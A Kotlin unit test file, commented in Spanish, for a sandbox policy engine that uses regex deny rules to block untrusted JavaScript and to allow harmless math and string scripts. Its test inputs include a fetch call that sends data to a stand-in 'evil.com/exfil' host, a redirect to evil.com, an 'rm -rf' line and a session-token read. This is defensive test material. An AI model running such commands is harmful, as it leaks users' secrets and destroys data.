package com.fenix.ia

import org.junit.Assert.*
import org.junit.Before
import org.junit.Test

/**
 * NODO-12 — COMPUERTA 3: Test unitario de SandboxPolicyEngine
 * Verifica que:
 *   - eval( es bloqueado (R-05)
 *   - fetch( es bloqueado (R-05)
 *   - Scripts matemáticos legítimos son permitidos
 *   - Todos los patrones prohibidos del manual son rechazados
 */
class PolicyEngineTest {

    // Copia de SandboxPolicyEngine para test unitario puro (sin Hilt/Android)
    private val forbiddenPatterns = listOf(
        Regex("\\beval\\s*\\("),
        Regex("\\bFunction\\s*\\("),
        Regex("process\\.exit"),
        Regex("require\\s*\\(\\s*['\"]fs['\"]"),
        Regex("XMLHttpRequest|fetch\\s*\\("),
        Regex("--force|rm\\s+-rf|del\\s+/"),
        Regex("localStorage|sessionStorage|indexedDB"),
        Regex("document\\.|window\\.|navigator\\.")
    )

    private fun audit(scriptBody: String): Boolean {
        forbiddenPatterns.forEach { pattern ->
            if (pattern.containsMatchIn(scriptBody)) return false
        }
        return true
    }

    // -----------------------------------------------------------------------
    // eval — debe ser BLOQUEADO
    // -----------------------------------------------------------------------

    @Test
    fun `bloquea eval directo`() {
        assertFalse(audit("const f = eval('1+1'); return f;"))
    }

    @Test
    fun `bloquea eval con espacio antes del paren`() {
        assertFalse(audit("eval  ('alert(1)')"))
    }

    @Test
    fun `bloquea new Function`() {
        assertFalse(audit("const fn = new Function('return 1');"))
    }

    // -----------------------------------------------------------------------
    // fetch — debe ser BLOQUEADO
    // -----------------------------------------------------------------------

    @Test
    fun `bloquea fetch de red`() {
        assertFalse(audit("fetch('https://evil.com/exfil?data=' + sensitiveData);"))
    }

    @Test
    fun `bloquea XMLHttpRequest`() {
        assertFalse(audit("const xhr = new XMLHttpRequest(); xhr.open('GET', url);"))
    }

    // -----------------------------------------------------------------------
    // localStorage / sessionStorage — debe ser BLOQUEADO
    // -----------------------------------------------------------------------

    @Test
    fun `bloquea localStorage`() {
        assertFalse(audit("localStorage.setItem('key', 'value');"))
    }

    @Test
    fun `bloquea sessionStorage`() {
        assertFalse(audit("sessionStorage.getItem('token');"))
    }

    @Test
    fun `bloquea indexedDB`() {
        assertFalse(audit("indexedDB.open('fenix_db');"))
    }

    // -----------------------------------------------------------------------
    // DOM APIs — deben ser BLOQUEADAS
    // -----------------------------------------------------------------------

    @Test
    fun `bloquea document API`() {
        assertFalse(audit("document.getElementById('root').innerHTML = 'hack';"))
    }

    @Test
    fun `bloquea window API`() {
        assertFalse(audit("window.location.href = 'https://evil.com';"))
    }

    // -----------------------------------------------------------------------
    // Comandos destructivos — deben ser BLOQUEADOS
    // -----------------------------------------------------------------------

    @Test
    fun `bloquea rm -rf`() {
        assertFalse(audit("rm -rf /data/app/"))
    }

    // -----------------------------------------------------------------------
    // Scripts LEGÍTIMOS — deben ser PERMITIDOS
    // -----------------------------------------------------------------------

    @Test
    fun `permite calculo de desviacion estandar`() {
        val script = """
            function calculateStdDev(numbers) {
                const mean = numbers.reduce((a, b) => a + b) / numbers.length;
                const squaredDiffs = numbers.map(n => Math.pow(n - mean, 2));
                return Math.sqrt(squaredDiffs.reduce((a, b) => a + b) / numbers.length);
            }
            return calculateStdDev([1,2,3,4,5]);
        """.trimIndent()
        assertTrue(audit(script))
    }

    @Test
    fun `permite operaciones matematicas basicas`() {
        val script = """
            const a = 10;
            const b = 20;
            return a + b;
        """.trimIndent()
        assertTrue(audit(script))
    }

    @Test
    fun `permite uso de Math y arrays`() {
        val script = """
            const datos = [5, 3, 8, 1, 9, 2];
            const max = Math.max(...datos);
            const min = Math.min(...datos);
            return { max, min, rango: max - min };
        """.trimIndent()
        assertTrue(audit(script))
    }

    @Test
    fun `permite string processing sin APIs prohibidas`() {
        val script = """
            function contarPalabras(texto) {
                return texto.trim().split(/\s+/).length;
            }
            return contarPalabras('Hola mundo fenix ia');
        """.trimIndent()
        assertTrue(audit(script))
    }

    @Test
    fun `permite JSON parse y stringify`() {
        val script = """
            const data = JSON.parse('{"valor": 42}');
            return JSON.stringify({ resultado: data.valor * 2 });
        """.trimIndent()
        assertTrue(audit(script))
    }
}
